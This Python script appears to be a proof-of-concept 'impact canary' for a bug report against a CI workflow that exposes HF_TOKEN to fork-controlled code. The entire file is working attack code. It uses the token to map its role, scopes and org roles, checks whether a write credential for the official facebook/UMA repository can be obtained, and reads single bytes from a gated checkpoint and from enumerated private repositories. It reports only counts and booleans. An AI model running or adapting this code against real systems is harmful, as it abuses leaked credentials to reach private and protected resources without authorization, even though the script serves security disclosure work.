"""
Copyright (c) Meta Platforms, Inc. and affiliates.

This source code is licensed under the MIT license found in the
LICENSE file in the root directory of this source tree.

Bounded Meta LHE impact canary.

The trusted documentation workflow injects ``HF_TOKEN`` into the step that
executes this fork-controlled file. This canary never prints the token,
identity names, repository names, response bodies, or file contents. It
reports only authorization classes, aggregate counts, and booleans. It
performs no repository write and exits before the documentation build and
artifact upload.
"""

from __future__ import annotations

import json
import os
import re
import sys
from collections import Counter
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlencode
from urllib.request import Request, urlopen


ENDPOINT = "https://huggingface.co"
MARKER = "META_LHE_FAIRCHEM_HF_IMPACT_CANARY"
USER_AGENT = "meta-lhe-fairchem-bounded-impact-canary/1.0"
TIMEOUT = 30
MAX_PAGES_PER_QUERY = 12


def emit(name: str, value: object) -> None:
    """Print one fixed-name, sanitized result field."""

    if isinstance(value, bool):
        rendered = str(value).lower()
    else:
        rendered = str(value)
    print(f"{MARKER}_{name}={rendered}", flush=True)


def request(
    url: str,
    token: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> Any:
    """Open an authenticated request without ever logging its URL or body."""

    request_headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": USER_AGENT,
    }
    if headers:
        request_headers.update(headers)
    return urlopen(
        Request(url, method=method, headers=request_headers),
        timeout=TIMEOUT,
    )


def get_json(url: str, token: str) -> tuple[object | None, int]:
    """Return JSON and status while suppressing bodies and identifiers on error."""

    try:
        with request(url, token) as response:
            return json.load(response), int(response.status)
    except HTTPError as error:
        error.close()
        return None, int(error.code)
    except (URLError, TimeoutError, ValueError, OSError):
        return None, 0


def status_only(url: str, token: str) -> int:
    """Perform a request and retain only its status, never its credential body."""

    try:
        with request(url, token) as response:
            return int(response.status)
    except HTTPError as error:
        error.close()
        return int(error.code)
    except (URLError, TimeoutError, ValueError, OSError):
        return 0


def range_read_one_byte(url: str, token: str) -> tuple[bool, int]:
    """Prove content readability while consuming and retaining only one byte."""

    try:
        with request(url, token, headers={"Range": "bytes=0-0"}) as response:
            one_byte = response.read(1)
            return len(one_byte) == 1 and response.status in (200, 206), int(
                response.status
            )
    except HTTPError as error:
        error.close()
        return False, int(error.code)
    except (URLError, TimeoutError, ValueError, OSError):
        return False, 0


def next_link(header: str | None) -> str | None:
    """Extract only the opaque next-page URL from an RFC 8288 Link header."""

    if not header:
        return None
    match = re.search(r'<([^>]+)>;\s*rel="next"', header)
    return match.group(1) if match else None


def list_private_repositories(
    collection: str,
    namespaces: list[str],
    token: str,
) -> tuple[list[str], bool, int]:
    """List private repo IDs internally; expose only counts and truncation state."""

    private_ids: list[str] = []
    truncated = False
    request_failures = 0
    for namespace in namespaces:
        params = urlencode(
            {
                "author": namespace,
                "limit": "1000",
                "expand": "private",
            }
        )
        url: str | None = f"{ENDPOINT}/api/{collection}?{params}"
        page = 0
        while url and page < MAX_PAGES_PER_QUERY:
            page += 1
            try:
                with request(url, token) as response:
                    payload = json.load(response)
                    if not isinstance(payload, list):
                        request_failures += 1
                        break
                    for item in payload:
                        if (
                            isinstance(item, dict)
                            and item.get("private") is True
                            and isinstance(item.get("id"), str)
                        ):
                            private_ids.append(item["id"])
                    url = next_link(response.headers.get("Link"))
            except HTTPError as error:
                error.close()
                request_failures += 1
                break
            except (URLError, TimeoutError, ValueError, OSError):
                request_failures += 1
                break
        if url:
            truncated = True
    return private_ids, truncated, request_failures


def prove_one_private_read(
    private_by_type: dict[str, list[str]], token: str
) -> tuple[bool, int]:
    """Read one byte from one private repo without revealing its ID or contents."""

    prefixes = {
        "models": "",
        "datasets": "datasets/",
        "spaces": "spaces/",
    }
    for collection in ("models", "datasets", "spaces"):
        for repo_id in private_by_type[collection]:
            encoded_id = quote(repo_id, safe="/")
            info, status = get_json(
                f"{ENDPOINT}/api/{collection}/{encoded_id}", token
            )
            if status != 200 or not isinstance(info, dict):
                continue
            siblings = info.get("siblings")
            if not isinstance(siblings, list):
                continue
            paths = [
                sibling.get("rfilename")
                for sibling in siblings
                if isinstance(sibling, dict)
                and isinstance(sibling.get("rfilename"), str)
            ]
            preferred = next(
                (
                    path
                    for candidate in ("README.md", ".gitattributes", "LICENSE")
                    for path in paths
                    if path == candidate
                ),
                paths[0] if paths else None,
            )
            if not preferred:
                continue
            file_url = (
                f"{ENDPOINT}/{prefixes[collection]}{encoded_id}/resolve/main/"
                f"{quote(preferred, safe='/')}"
            )
            readable, read_status = range_read_one_byte(file_url, token)
            if readable:
                return True, read_status
    return False, 0


def main() -> int:
    token = os.environ.get("HF_TOKEN", "")
    emit("TOKEN_PRESENT", bool(token))
    emit("TOKEN_VALUE_EMITTED", False)
    emit("IDENTITY_NAMES_EMITTED", False)
    emit("REPOSITORY_NAMES_EMITTED", False)
    emit("EXISTING_RESOURCE_MUTATED", False)
    emit("OFFICIAL_ARTIFACT_MUTATED", False)
    if not token:
        emit("WHOAMI_AUTHENTICATED", False)
        return 78

    whoami, whoami_status = get_json(f"{ENDPOINT}/api/whoami-v2", token)
    authenticated = whoami_status == 200 and isinstance(whoami, dict)
    emit("WHOAMI_HTTP_STATUS", whoami_status)
    emit("WHOAMI_AUTHENTICATED", authenticated)
    if not authenticated:
        return 78
    assert isinstance(whoami, dict)

    auth = whoami.get("auth") if isinstance(whoami.get("auth"), dict) else {}
    access = (
        auth.get("accessToken")
        if isinstance(auth.get("accessToken"), dict)
        else {}
    )
    role = access.get("role") if isinstance(access.get("role"), str) else "unknown"
    emit("TOKEN_ROLE", role)

    fine = (
        access.get("fineGrained")
        if isinstance(access.get("fineGrained"), dict)
        else {}
    )
    scoped = fine.get("scoped") if isinstance(fine.get("scoped"), list) else []
    scoped_permissions = [
        permission
        for entry in scoped
        if isinstance(entry, dict)
        for permission in entry.get("permissions", [])
        if isinstance(permission, str)
    ]
    emit("FINE_GRAINED_SCOPE_COUNT", len(scoped))
    emit(
        "FINE_GRAINED_READ_PERMISSION_COUNT",
        sum(permission.endswith(".read") for permission in scoped_permissions),
    )
    emit(
        "FINE_GRAINED_WRITE_PERMISSION_COUNT",
        sum(permission.endswith(".write") for permission in scoped_permissions),
    )
    emit("FINE_GRAINED_CAN_READ_GATED", bool(fine.get("canReadGatedRepos")))

    orgs = whoami.get("orgs") if isinstance(whoami.get("orgs"), list) else []
    org_roles = Counter(
        org.get("roleInOrg", "unknown")
        for org in orgs
        if isinstance(org, dict)
    )
    emit("ORG_COUNT", len(orgs))
    for org_role in ("admin", "write", "contributor", "read", "no_access"):
        emit(f"ORG_ROLE_{org_role.upper()}_COUNT", org_roles[org_role])

    official_org = next(
        (
            org
            for org in orgs
            if isinstance(org, dict) and org.get("name") == "facebook"
        ),
        None,
    )
    official_role = (
        official_org.get("roleInOrg", "unknown")
        if isinstance(official_org, dict)
        else "none"
    )
    restrictions = (
        official_org.get("securityRestrictions", [])
        if isinstance(official_org, dict)
        else []
    )
    emit("OFFICIAL_NAMESPACE_MEMBERSHIP_PRESENT", official_org is not None)
    emit("OFFICIAL_NAMESPACE_ROLE", official_role)
    emit(
        "OFFICIAL_NAMESPACE_SECURITY_RESTRICTION_COUNT",
        len(restrictions) if isinstance(restrictions, list) else 0,
    )

    # The response is a short-lived Xet upload credential only for callers
    # authorized to write the existing official UMA repository. Discard the
    # credential body and all headers; retain only the HTTP status.
    official_write_status = status_only(
        f"{ENDPOINT}/api/models/facebook/UMA/xet-write-token/main", token
    )
    emit("OFFICIAL_REPO_XET_WRITE_HTTP_STATUS", official_write_status)
    emit("OFFICIAL_REPO_XET_WRITE_AUTHORIZED", official_write_status == 200)

    # Read one byte from an actual gated UMA checkpoint. No model byte, URL,
    # redirect, or response header is printed or persisted.
    gated_read, gated_status = range_read_one_byte(
        f"{ENDPOINT}/facebook/UMA/resolve/main/checkpoints/uma-s-1p2p1.pt",
        token,
    )
    emit("GATED_CHECKPOINT_HTTP_STATUS", gated_status)
    emit("GATED_CHECKPOINT_ONE_BYTE_READ", gated_read)

    owner = whoami.get("name") if isinstance(whoami.get("name"), str) else None
    namespaces = [namespace for namespace in (owner, "facebook") if namespace]
    namespaces = list(dict.fromkeys(namespaces))
    private_by_type: dict[str, list[str]] = {}
    enumeration_truncated = False
    enumeration_failures = 0
    for collection in ("models", "datasets", "spaces"):
        repo_ids, truncated, failures = list_private_repositories(
            collection, namespaces, token
        )
        private_by_type[collection] = repo_ids
        enumeration_truncated = enumeration_truncated or truncated
        enumeration_failures += failures
        emit(f"PRIVATE_{collection.upper()}_ACCESSIBLE_COUNT", len(repo_ids))
    emit("PRIVATE_ENUMERATION_TRUNCATED", enumeration_truncated)
    emit("PRIVATE_ENUMERATION_FAILURE_COUNT", enumeration_failures)
    private_read, private_read_status = prove_one_private_read(private_by_type, token)
    emit("PRIVATE_RESOURCE_ONE_BYTE_READ_HTTP_STATUS", private_read_status)
    emit("PRIVATE_RESOURCE_ONE_BYTE_READ", private_read)

    # Stop before jupytext, the documentation build, and artifact upload.
    emit("PROBE_COMPLETE", True)
    emit("INTENTIONAL_STOP_BEFORE_BUILD", True)
    return 78


if __name__ == "__main__":
    sys.exit(main())
